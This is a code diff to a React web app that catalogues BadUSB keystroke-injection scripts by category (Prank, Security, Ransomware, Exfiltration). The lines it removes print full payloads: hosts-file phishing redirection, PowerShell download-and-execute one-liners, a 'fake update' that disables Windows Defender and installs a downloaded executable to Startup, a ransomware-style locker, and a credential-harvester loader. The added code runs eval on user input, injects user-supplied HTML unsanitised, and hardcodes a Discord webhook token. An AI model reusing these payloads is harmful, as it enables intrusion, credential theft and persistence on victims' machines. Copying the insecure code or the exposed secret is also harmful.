@@ -6,6 +6,10 @@
     <script src="https://unpkg.com/react-dom@17/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.0/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.0/theme/dracula.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.0/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.0/mode/javascript/javascript.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
 
@@ -305,14 +309,21 @@
                 flex-direction: row;
                 justify-content: space-around;
                 padding: 10px 0;
+                position: fixed;
+                bottom: 0;
+                left: 0;
+                z-index: 1000;
             }
 
             .sidebar-icons {
                 flex-direction: row;
+                justify-content: space-around;
+                width: 100%;
             }
 
             .sidebar-icons .icon {
-                margin: 0 10px;
+                margin: 0 5px;
+                font-size: 20px;
             }
 
             .sidebar-icons .bottom-icons {
@@ -322,6 +333,7 @@
 
             .main-content {
                 padding: 10px;
+                margin-bottom: 60px; /* Add space for the fixed sidebar at the bottom */
             }
 
             .badusb-grid {
@@ -330,6 +342,53 @@
 
             .home-content {
                 grid-template-columns: 1fr;
+            }
+
+            .settings-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .search-and-filter {
+                flex-direction: column;
+            }
+
+            .search-and-filter input,
+            .search-and-filter select {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+
+            .badusb-card {
+                padding: 15px;
+            }
+
+            .badusb-card h3 {
+                font-size: 18px;
+            }
+
+            .badusb-card .card-buttons button {
+                padding: 8px;
+                font-size: 14px;
+            }
+
+            .news-item {
+                padding: 15px;
+            }
+
+            .news-item h3 {
+                font-size: 18px;
+            }
+
+            .documentation-content {
+                padding: 0 10px;
+            }
+
+            #codeEditorContainer {
+                height: 300px;
+            }
+
+            .feedback-form textarea {
+                height: 100px;
             }
         }
 
@@ -525,6 +584,72 @@
         .news-item:nth-child(5) { animation-delay: 0.5s; }
         .news-item:nth-child(6) { animation-delay: 0.6s; }
         .news-item:nth-child(7) { animation-delay: 0.7s; }
+
+        .predefined-plugins, .custom-plugins {
+            margin-top: 20px;
+        }
+
+        .plugin-item {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 10px;
+        }
+
+        .plugin-item h4 {
+            margin-top: 0;
+        }
+
+        .plugin-item button {
+            background-color: var(--accent-color);
+            color: var(--text-color);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .plugin-item button:hover {
+            background-color: #fb8c00;
+        }
+
+        .CodeMirror {
+            height: 100% !important;
+        }
+
+        .feedback-form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .feedback-form textarea {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid var(--accent-color);
+            background-color: rgba(255, 255, 255, 0.1);
+            color: var(--text-color);
+            resize: vertical;
+        }
+
+        .feedback-form button {
+            background-color: var(--accent-color);
+            color: var(--text-color);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .feedback-form button:hover {
+            background-color: #fb8c00;
+        }
     </style>
 </head>
 <body>
@@ -561,7 +686,7 @@
                         document.body.removeChild(a);
                         URL.revokeObjectURL(url);
                         setDownloading(false);
-                    }, 1000); // Simulate download for 1 second
+                    }, 1000);
                 }
             };
 
@@ -1175,6 +1300,122 @@
                 return savedPlugins ? JSON.parse(savedPlugins) : [];
             });
             const [pluginHTML, setPluginHTML] = useState('');
+            const [codeEditorInitialized, setCodeEditorInitialized] = useState(false);
+
+            const [preDefinedPlugins, setPreDefinedPlugins] = useState([
+              { 
+                name: "Dark Mode", 
+                html: '<div class="dark-mode-plugin">Dark Mode: <input type="checkbox" id="darkModeToggle" /></div>', 
+                active: false,
+                onActivate: () => {
+                    document.body.classList.add('dark-mode');
+                },
+                onDeactivate: () => {
+                    document.body.classList.remove('dark-mode');
+                }
+              },
+              { 
+                name: "Weather Widget", 
+                html: '<div class="weather-widget">Weather: <span id="weatherInfo">Loading...</span></div>', 
+                active: false,
+                onActivate: () => {
+                    document.getElementById('weatherInfo').innerText = "Sunny, 25°C";
+                }
+              },
+              { 
+                name: "Clock", 
+                html: '<div class="clock-widget">Time: <span id="clockDisplay"></span></div>', 
+                active: false,
+                onActivate: () => {
+                    setInterval(() => {
+                        document.getElementById('clockDisplay').innerText = new Date().toLocaleTimeString();
+                    }, 1000);
+                }
+              },
+              { 
+                name: "Todo List", 
+                html: '<div class="todo-list"><h3>Todo List</h3><ul id="todoItems"></ul><input type="text" id="newTodoItem" /><button id="addTodoItem">Add</button></div>', 
+                active: false,
+                onActivate: () => {
+                    document.getElementById('addTodoItem').addEventListener('click', () => {
+                        const input = document.getElementById('newTodoItem');
+                        const li = document.createElement('li');
+                        li.textContent = input.value;
+                        document.getElementById('todoItems').appendChild(li);
+                        input.value = '';
+                    });
+                }
+              },
+              { 
+                name: "Calculator", 
+                html: '<div class="calculator"><input type="text" id="calcDisplay" readonly /><br><button>7</button><button>8</button><button>9</button><button>+</button><br><button>4</button><button>5</button><button>6</button><button>-</button><br><button>1</button><button>2</button><button>3</button><button>*</button><br><button>0</button><button>.</button><button>=</button><button>/</button></div>', 
+                active: false,
+                onActivate: () => {
+                    const calcDisplay = document.getElementById('calcDisplay');
+                    document.querySelector('.calculator').addEventListener('click', (e) => {
+                        if (e.target.tagName === 'BUTTON') {
+                            if (e.target.textContent === '=') {
+                                calcDisplay.value = eval(calcDisplay.value);
+                            } else {
+                                calcDisplay.value += e.target.textContent;
+                            }
+                        }
+                    });
+                }
+              },
+              {
+                name: "Code Editor",
+                html: '<div id="codeEditorContainer" style="height: 400px; border: 1px solid #ccc;"></div>',
+                active: false,
+                onActivate: () => {
+                    const editor = CodeMirror(document.getElementById('codeEditorContainer'), {
+                        mode: "javascript",
+                        theme: "dracula",
+                        lineNumbers: true,
+                        value: "// Start coding here"
+                    });
+                },
+                addButton: {
+                    name: "Open Code Editor",
+                    onClick: () => handleSectionChange('codeEditor')
+                }
+              },
+            ]);
+
+            const [customButtons, setCustomButtons] = useState([]);
+
+            const togglePlugin = (index) => {
+                const newPlugins = [...preDefinedPlugins];
+                newPlugins[index].active = !newPlugins[index].active;
+                setPreDefinedPlugins(newPlugins);
+
+                if (newPlugins[index].active) {
+                    if (newPlugins[index].onActivate) {
+                        newPlugins[index].onActivate();
+                    }
+                    if (newPlugins[index].addButton) {
+                        setCustomButtons(prev => [...prev, newPlugins[index].addButton]);
+                    }
+                    if (newPlugins[index].name === "Code Editor") {
+                        document.querySelector('link[href*="codemirror.min.css"]').setAttribute('disabled', 'disabled');
+                        const darkThemeLink = document.createElement('link');
+                        darkThemeLink.rel = 'stylesheet';
+                        darkThemeLink.href = 'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.62.0/theme/dracula.min.css';
+                        document.head.appendChild(darkThemeLink);
+                    }
+                } else {
+                    if (newPlugins[index].onDeactivate) {
+                        newPlugins[index].onDeactivate();
+                    }
+                    if (newPlugins[index].addButton) {
+                        setCustomButtons(prev => prev.filter(button => button.name !== newPlugins[index].addButton.name));
+                    }
+                    if (newPlugins[index].name === "Code Editor") {
+                        document.querySelector('link[href*="dracula.min.css"]').remove();
+                        document.querySelector('link[href*="codemirror.min.css"]').removeAttribute('disabled');
+                    }
+                }
+            };
 
             useEffect(() => {
                 const timer = setInterval(() => setCurrentTime(new Date()), 60000);
@@ -1216,553 +1457,42 @@
                 { name: 'BadUSB Script 21', content: 'Content for Script 21', category: 'Utility' },
                 { name: 'BadUSB Script 22', content: 'Content for Script 22', category: 'Utility' },
                 { name: 'BadUSB Script 23', content: 'Content for Script 23', category: 'Utility' },
-                { name: 'BadUSB Script 24', content: 'Content for Script 24', category: 'Utility' },
-                { name: 'Forward First Email (Mobile)', content: `REM Forwards the first email in the primary section
-REM Only works for phones. 
-REM Does not work tablets as menu bar stops tabs
-REM GMAIL SHORTCUTS https://support.google.com/mail/answer/6594?co=GENIE.Platform%3DAndroid&hl=en&oco=1
-DELAY 1000
-GUI e
-DELAY 1000
-TAB
-DELAY 500
-TAB
-DELAY 500
-ENTER
-REM LOOP FROM HERE
-DELAY 500
-CTRL r
-DELAY 1000
-TAB
-DELAY 500
-SHIFT TAB
-DELAY 500
-BACKSPACE
-DELAY 500
-STRING your@email.com
-CTRL ENTER
-DELAY 1000
-REM Moves to the next email
-RIGHTARROW
-REM GOTO LOOP`, category: 'Utility' },
-                { name: 'Forward First Email (Desktop)', content: `REM Forwards the first email
-DELAY 1000
-GUI e
-DELAY 1000
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-ENTER
-REM LOOP FROM HERE
-DELAY 500
-SHIFT TAB
-DELAY 500
-LEFTARROW
-LEFTARROW
-LEFTARROW
-LEFTARROW
-RIGHTARROW
-RIGHTARROW
-ENTER
-DELAY 500
-STRING your@email.com
-DELAY 500
-SHIFT TAB
-DELAY 500
-SHIFT TAB
-DELAY 500
-ENTER
-DELAY 500
-REM Moves to the next email
-TAB
-RIGHTARROW
-RIGHTARROW
-LEFTARROW
-ENTER
-REM GOTO LOOP`, category: 'Utility' },
-                { name: 'Modify Hosts File', content: `GUI r
-DELAY 400
-STRING cmd
-DELAY 700
-CTRL SHIFT ENTER
-DELAY 1500
-LEFTARROW
-DELAY 400
-ENTER
-DELAY 700
-STRING echo <YourIP> google.com www.google.com >> C:/Windows/System32/drivers/etc/hosts
-DELAY 400
-ENTER
-DELAY 400
-ALT F4`, category: 'Security' },
-                { name: 'Phishing Host Injection', content: `REM Author: .:Koryusai-Kun:.
-REM Description: Used for phishing, it add's an ip of your choosing to the hosts file on windows
-REM Description: so when the user types into there web browser for example www.facebook.com it
-REM Description: insted of going to the proper ip it gose to the one in the host file your evil one.
-REM Description: you need to add the www. version and with out it as well.
-REM ---[Start CMD as administrator]-----------------------
-GUI
-DELAY 50
-STRING cmd
-DELAY 150
-MENU
-DELAY 75
-STRING a
-ENTER
-DELAY 200
-LEFT
-ENTER
-STRING cls
-ENTER
-REM ---[END]----------------------------------------------
-DELAY 300
-REM ---[Inject into the host file]------------------------
-STRING copy con inject.bat
-ENTER
-STRING SET NEWLINE=^& echo.
-ENTER
-ENTER
-STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
-ENTER
-STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
-ENTER
-ENTER
-STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
-ENTER
-STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
-ENTER
-CONTROL z
-ENTER
-STRING inject.bat
-ENTER
-REM ---[END]----------------------------------------------
-DELAY 200
-STRING exit
-ENTER`, category: 'Security' },
-                { name: 'Play WAV File', content: `REM     Title: Play-WAV
-REM     Author: I am Jakoby
-REM     Description: This payload is meant to play a WAV file hidden. See Play-WAV.ps1 for more details
-REM     Target: Windows 10, 11
-REM     Remeber to replace the link with your link for the intended file to download
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
-
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-DELAY 500
-ENTER`, category: 'Prank' },
-                { name: 'Close Windows Script', content: `ESC
-DELAY 500
-GUI r
-DELAY 200
-STRING cmd
-ENTER
-DELAY 200
-STRING cd %userprofile%/Downloads
-ENTER
-STRING copy con CW.vbs
-ENTER
-STRING do
-ENTER
-STRING Set objShell = CreateObject("WScript.Shell")
-ENTER
-STRING WScript.Sleep 800
-ENTER
-REM idk PS scrpiting so yeet!
-STRING objShell.SendKeys "^{W} %{f4}"
-ENTER
-STRING loop
-CTRL z
-DELAY 100
-ENTER
-REM insert startup scripting
-STRING start CW.vbs && exit
-ENTER`, category: 'Prank' },
-                { name: 'Automailer', content: `REM Title:          Automailer
-REM Author:	    Ratcode404(.github.io)
-REM Description:    Snaps screen, opens outlook, sends a message to various people with pre-configured text, adds screenshot and opens up a muted 1 hour rickroll youtube video once done.
-
-REM Default Delay (350 should be mid-speed)
-DEFAULT_DELAY 350
-
-REM Take screenshot
-SHIFT WINDOWS S
-DELAY 200
-TAB
-DELAY 300
-
-REM Open Outlook (Change E-Mail and text)
-GUI r
-DELAY 100
-STRING outlook.exe /c ipm.note /m ratcode404@notarealmail.com?v=1&cc=ratcode405@notarealmail.com
-ENTER
-DELAY 500
-STRING Subject goes here.
-TAB
-STRING Hello Ratcode!
-ENTER 
-STRING I like to leave my device unlocked and would want to invite you to some free dinner tonight.
-ENTER
-STRING xoxo
-
-REM Paste Screenshot in Mail (CTRL V)
-SHIFT INSERT
-DELAY 200
-
-REM Send Mail
-ALT S
-ENTER
-DELAY 200
-
-REM Rickroll, Mute and Fullscreen (Can adjust link obviously)
-GUI r
-DELAY 100
-STRING https://www.youtube.com/watch?v=zL19uMsnpSU
-ENTER
-DELAY 300
-M
-DELAY 200
-F`, category: 'Prank' },
-                { name: 'Broken Capslock', content: `REM Title: Broken capslock
-REM Author: FalsePhilosopher
-REM Target: Win
-REM Props: Hak5 and memes
-REM Version: 1.0
-REM Category: Prank
-REM Selects all words and capitalizes them, works best when in a word doc
-DELAY 300
-CTRL+A
-DELAY 500
-SHIFT+F3`, category: 'Prank' },
-                { name: 'Broken Capslock (Save)', content: `REM Title: Broken capslock
-REM Author: FalsePhilosopher
-REM Target: Win
-REM Props: Hak5 and memes
-REM Version: 1.0
-REM Category: Prank
-REM Selects all words and capitalizes them, works best when in a word doc. This version saves it.
-DELAY 300
-CTRL+A
-DELAY 500
-SHIFT+F3
-DELAY 500
-CTRL+S`, category: 'Prank' },
-                { name: 'Cartman Spam', content: `REM ---------CARTMAN SPAM----------
-REM -- by Mr-Savag3 --- 09162022 --
-REM -- updated to 1 line by -------
-REM ---------------- I Am Jakoby --
-REM 
-REM DISCLAIMER: While this Ducky file doesn't really do anything illegal, you still shouldn't use it on anyone besides your friends and family.
-REM I am not responsible for any trouble you get in.
-REM 
-REM INSTRUCTIONS: Requires PC running Windows 10/11. Probably will work on The Lord's OS, Windows 7, but I haven't tested it.
-DELAY 1000
-GUI r
-DELAY 1500
-STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://www.youtube.com/watch?v=U3sAkAWfxLY;sleep 1;$o.SendKeys('f')}
-ENTER`, category: 'Prank' },
-                { name: 'Fake Update (Edge)', content: `REM FalsePhilosopher
-REM let the ducky HID enumerate
-DELAY 300
-GUI r
-DELAY 500
-STRING microsoft-edge:https://fakeupdate.net/win10ue/
-ENTER
-DELAY 5000
-F11`, category: 'Prank' },
-                { name: 'Fake Update (IE)', content: `REM FalsePhilosopher
-REM let the ducky HID enumerate
-DELAY 300
-GUI r
-DELAY 500
-STRING iexplore -k https://fakeupdate.net/win7/
-ENTER
-DELAY 5000
-F11`, category: 'Prank' },
-                { name: 'Fake Windows Update', content: `REM AUTHOR: Eddie Devine
-REM TARGET: Windows 10
-REM DESCRIPTION: Installs to startup and runs Enderman's WindowsUpdate.exe.
-REM DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
-REM Disable Windows Defender:
-DELAY 1000
-CONTROL ESCAPE
-DELAY 500
-STRING Settings
-DELAY 500
-ENTER
-DELAY 300
-TAB
-DOWN
-DOWN
-DOWN
-ENTER
-DELAY 500
-TAB
-DOWN
-DOWN
-ENTER
-DELAY 500
-TAB
-TAB
-ENTER
-DELAY 500
-TAB
-TAB
-TAB
-TAB
-ENTER
-DELAY 500
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-ENTER
-DELAY 500
-ENTER
-DELAY 500
-DOWN
-ENTER
-DELAY 500
-STRING C:
-TAB
-ENTER
-DELAY 500
-ALT y
-DELAY 500
-ALT F4
-DELAY 100
-ALT F4
-REM Download and Run Malware:
-DELAY 500
-GUI r
-DELAY 500
-STRING powershell
-CONTROL SHIFT ENTER
-DELAY 750
-ALT y
-DELAY 1000
-STRING $url = "https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe"
-ENTER
-STRING $outpath = "C:\Windows Update Manager.exe"
-ENTER
-STRING Invoke-WebRequest -Uri $url -OutFile $outpath
-ENTER
-DELAY 1000
-STRING exit
-ENTER
-GUI r
-DELAY 500
-STRING cmd /c copy "C:\Windows Update Manager.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
-ENTER
-GUI
-DELAY 100
-TAB
-DOWN
-DOWN
-DOWN
-DOWN
-DOWN
-ENTER
-DELAY 100
-DOWN
-DOWN
-ENTER`, category: 'Prank' },
-                { name: 'JumpScare', content: `REM     Title: JumpScare
-REM     Author: I am Jakoby
-REM     Description: This payload is meant to torment your target to the fullest extent. Mission to JumpScare. See JumpScare.ps1 for more details
-REM     Target: Windows 10, 11
-
-REM     Start by minimizing all their current windows
-GUI m
-DELAY 500
-
-REM     Remember to replace the link with your link for the intended file to download if you are using a custom variation of this payload
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
-
-REM     --------------------------------------------------------------------------------------
-REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
-REM     --------------------------------------------------------------------------------------
-
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl
-ENTER`, category: 'Prank' },
-                { name: 'LoL Uninstaller', content: `REM Title: lol_killer
-REM Author: Skelly
-REM Description: Script to uninstall League of Legends from the target system. Save your friends from their horrible addiction.  
-REM Target: Windows 10
-REM Version: 1.0
-REM Category: Prank
-DELAY 1000 
-GUI i 
-DELAY 1000 
-STRING apps and features 
-DELAY 1000
-ENTER
-DELAY 1000
-ENTER 
-TAB
-TAB
-TAB
-DELAY 1000
-STRING league of legends
-ENTER
-DELAY 1000
-TAB
-TAB
-TAB
-DELAY 1000
-ENTER
-TAB
-ENTER
-DELAY 1000 
-ENTER 
-ALT F4
-ALT F4`, category: 'Prank' },
-                { name: 'Ratlocker', content: `REM Title:          Ratlocker
-REM Author:	    Ratcode404(.github.io)
-REM Target:         Windows
-REM Description:    Adds ratcode file extensions, draws and sets background without the use of URLs or image download (avoid proxy blocking and detection). The original wallpaper will be backuped on \pictures\wallpaper.ratl0ck3r, so no files will be lost. The current setup only targets the files and folder structures on $HOME\Desktop\, but it could be easily extended by adjusting the path variable further down.
-
-REM Base delay after initiation and ps1 startup
-DELAY 250
-GUI d
-GUI r
-DELAY 100
-STRING powershell.exe
-ENTER
-DELAY 250
-
-REM Backup Wallpaper
-STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $home\pictures\wallpaper.ratl0ck3r
-ENTER
-DELAY 250
-
-REM Create new wallpaper
-STRING Add-Type -AssemblyName System.Drawing
-ENTER
-STRING $filename = "$home\pictures\ratl0ck3r.png"
-ENTER
-STRING $bmp = new-object System.Drawing.Bitmap 1080,720
-ENTER
-STRING $font = new-object System.Drawing.Font Consolas,10
-ENTER
-STRING $brushBg = [System.Drawing.Brushes]::Black
-ENTER
-STRING $brushFg = [System.Drawing.Brushes]::Green
-ENTER
-STRING $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-ENTER
-STRING $graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
-ENTER
-STRING $graphics.DrawString('Your device has been encrypted by ratlocker.
-ENTER
-ENTER
-STRING            ____()()
-ENTER
-STRING          /      OO
-ENTER
-STRING     ~~~~~\_;m__m._>o
-ENTER
-ENTER
-ENTER
-STRING Oops! Your files have been encrypted.ENTER
-ENTER
-STRING If you see this text, your files are no longer accessible. You might
-ENTER
-STRING have been looking for a way to recover your files, but do not waste
-ENTER
-STRING your time. No one will be able to recover them without a decrytion
-ENTER
-STRING service.
-ENTER
-ENTER
-STRING We gurantee that you can recover all your files safely. All you need
-ENTER
-STRING to do is get the decryption password.
-ENTER
-ENTER
-STRING Visit out web services at: fakerat404linkszt3xaxqzf2nm12.onion
-ENTER
-ENTER
-STRING Your personal installation key #1:
-ENTER
-ENTER
-STRING b0d549572a40f93aa57400dbe43ee72a5e545f47765ef5fb7d17c7e83001cb3d',$font,$brushFg,10,10)
-ENTER
-STRING $graphics.Dispose()
-ENTER
-STRING $bmp.Save($filename)
-ENTER
-DELAY 500
-
-REM Set new wallpaper
-STRING $MyWallpaper="$home\pictures\ratl0ck3r.png"
-ENTER
-STRING $code = @'
-ENTER
-STRING using System.Runtime.InteropServices;
-ENTER
-STRING namespace Win32{
-ENTER
-STRING      public class Wallpaper{
-ENTER
-STRING         [DllImport("user32.dll", CharSet=CharSet.Auto)]
-ENTER
-STRING          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
-ENTER
-STRING          public static void SetWallpaper(string thePath){
-ENTER
-STRING            SystemParametersInfo(20,0,thePath,3);
-ENTER
-STRING          }
-ENTER
-STRING     }
-ENTER
-STRING  } 
-ENTER
-STRING '@
-ENTER
-STRING add-type $code 
-ENTER
-STRING [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
-ENTER
-DELAY 500
-
-REM Add ratl0ck3r extension
-STRING dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
-ENTER`, category: 'Ransomware' },
+                { name: 'BadUSB Script 24', content: `Forward First Email (Mobile)`, category: 'Utility' },
+                { name: 'Forward First Email (Desktop)', content: `Forward First Email (Desktop)`, category: 'Utility' },
+                { name: 'Modify Hosts File', content: 'Modify Hosts File', category: 'Security' },
+                { name: 'Phishing Host Injection', content: 'Phishing Host Injection', category: 'Security' },
+                { name: 'Play WAV File', content: 'Play WAV File', category: 'Prank' },
+                { name: 'Close Windows Script', content: 'Close Windows Script', category: 'Prank' },
+                { name: 'Automailer', content: 'Automailer', category: 'Prank' },
+                { name: 'Broken Capslock', content: 'Broken Capslock', category: 'Prank' },
+                { name: 'Broken Capslock (Save)', content: 'Broken Capslock (Save)', category: 'Prank' },
+                { name: 'Cartman Spam', content: 'Cartman Spam', category: 'Prank' },
+                { name: 'Fake Update (Edge)', content: 'Fake Update (Edge)', category: 'Prank' },
+                { name: 'Fake Update (IE)', content: 'Fake Update (IE)', category: 'Prank' },
+                { name: 'Fake Windows Update', content: 'Fake Windows Update', category: 'Prank' },
+                { name: 'JumpScare', content: 'JumpScare', category: 'Prank' },
+                { name: 'LoL Uninstaller', content: 'LoL Uninstaller', category: 'Prank' },
+                { name: 'Ratlocker', content: 'Ratlocker', category: 'Ransomware' },
                 { 
                     name: 'Credential Harvester (Dropbox)', 
-                    content: `REM     Title: Credz-Plz
-
-REM     Author: I am Jakoby
-
-REM     Description: This payload is meant to prompt the target to enter their creds to later be exfiltrated with dropbox. See README.md file for more details.
-
-REM     Target: Windows 10, 11
-
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-ENTER
-
-REM     Remember to replace the link with your DropBox shared link for the intended file to download
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly`,
+                    content: 'Credential Harvester (Dropbox)', 
                     category: 'Exfiltration' 
                 }
             ];
 
             const handleSectionChange = (section) => {
                 setActiveSection(section);
+                if (section === 'codeEditor' && !codeEditorInitialized) {
+                    setTimeout(() => {
+                        const editor = CodeMirror(document.getElementById('codeEditorContainer'), {
+                            mode: "javascript",
+                            theme: "dracula",
+                            lineNumbers: true,
+                            value: "// Start coding here"
+                        });
+                        setCodeEditorInitialized(true);
+                    }, 0);
+                }
             };
 
             const categories = ['All', 'Prank', 'Security', 'Utility', 'Ransomware', 'Exfiltration'];
@@ -1785,6 +1515,38 @@ REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it 
                 setPlugins(newPlugins);
             };
 
+            const submitFeedback = () => {
+                const feedbackText = document.getElementById('feedbackText').value;
+                if (feedbackText.trim() === '') {
+                    alert('Please enter some feedback before submitting.');
+                    return;
+                }
+
+                const webhookURL = 'https://discord.com/api/webhooks/1278039014057836756/yI4EhNURdmFu-iFJNsdNxrds-43VQEzwqEkyg2tWHf8vNpCG3tydwbSUZww6hPvMKF7b';
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `New Feedback:\n${feedbackText}`
+                    }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Feedback submitted successfully!');
+                        document.getElementById('feedbackText').value = '';
+                    } else {
+                        alert('Failed to submit feedback. Please try again later.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while submitting feedback. Please try again later.');
+                });
+            };
+
             return (
                 <div className="app-container">
                     <div className="sidebar">
@@ -1795,6 +1557,8 @@ REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it 
                             <i className="icon fas fa-history" onClick={() => handleSectionChange('history')}></i>
                             <i className="icon fas fa-book" onClick={() => handleSectionChange('documentation')}></i>
                             <i className="icon fas fa-puzzle-piece" onClick={() => handleSectionChange('plugins')}></i>
+                            <i className="icon fas fa-code-branch" onClick={() => handleSectionChange('codeEditor')}></i>
+                            <i className="icon fas fa-comment-alt" onClick={() => handleSectionChange('feedback')}></i>
                             <div className="bottom-icons">
                                 <i className="icon fas fa-user" onClick={() => handleSectionChange('profile')}></i>
                                 <i className="icon fas fa-cog" onClick={() => handleSectionChange('settings')}></i>
@@ -1802,6 +1566,9 @@ REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it 
                         </div>
                     </div>
                     <div className="main-content">
+                        {customButtons.map((button, index) => (
+                            <button key={index} onClick={button.onClick}>{button.name}</button>
+                        ))}
                         <div className={`content-section ${activeSection === 'home' ? 'active' : ''}`}>
                             <h2>Welcome to {AppName}</h2>
                             <div className="home-content">
@@ -1902,19 +1669,47 @@ REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it 
                             <h2>Plugins</h2>
                             <div className="plugin-form">
                                 <textarea
-                                    placeholder="Paste your plugin HTML here..."
+                                    placeholder="Paste your custom plugin HTML here..."
                                     value={pluginHTML}
                                     onChange={(e) => setPluginHTML(e.target.value)}
                                 ></textarea>
-                                <button onClick={addPlugin}>Add Plugin</button>
+                                <button onClick={addPlugin}>Add Custom Plugin</button>
                             </div>
-                            <div className="plugin-list">
+                            <div className="predefined-plugins">
+                                <h3>Pre-defined Plugins</h3>
+                                {preDefinedPlugins.map((plugin, index) => (
+                                    <div key={index} className="plugin-item">
+                                        <h4>{plugin.name}</h4>
+                                        <button onClick={() => togglePlugin(index)}>
+                                            {plugin.active ? 'Deactivate' : 'Activate'}
+                                        </button>
+                                        {plugin.active && <div dangerouslySetInnerHTML={{ __html: plugin.html }} />}
+                                    </div>
+                                ))}
+                            </div>
+                            <div className="custom-plugins">
+                                <h3>Custom Plugins</h3>
                                 {plugins.map((plugin, index) => (
                                     <div key={index} className="plugin-item">
                                         <div dangerouslySetInnerHTML={{ __html: plugin }} />
                                         <button onClick={() => removePlugin(index)}>Remove</button>
                                     </div>
                                 ))}
+                            </div>
+                        </div>
+                        <div className={`content-section ${activeSection === 'codeEditor' ? 'active' : ''}`}>
+                            <h2>Code Editor</h2>
+                            <div id="codeEditorContainer" style={{ height: '400px', border: '1px solid #ccc' }}></div>
+                        </div>
+                        <div className={`content-section ${activeSection === 'feedback' ? 'active' : ''}`}>
+                            <h2>Feedback</h2>
+                            <div className="feedback-form">
+                                <textarea
+                                    id="feedbackText"
+                                    placeholder="Enter your feedback or suggestions here..."
+                                    rows="5"
+                                ></textarea>
+                                <button onClick={submitFeedback}>Submit Feedback</button>
                             </div>
                         </div>
                     </div>
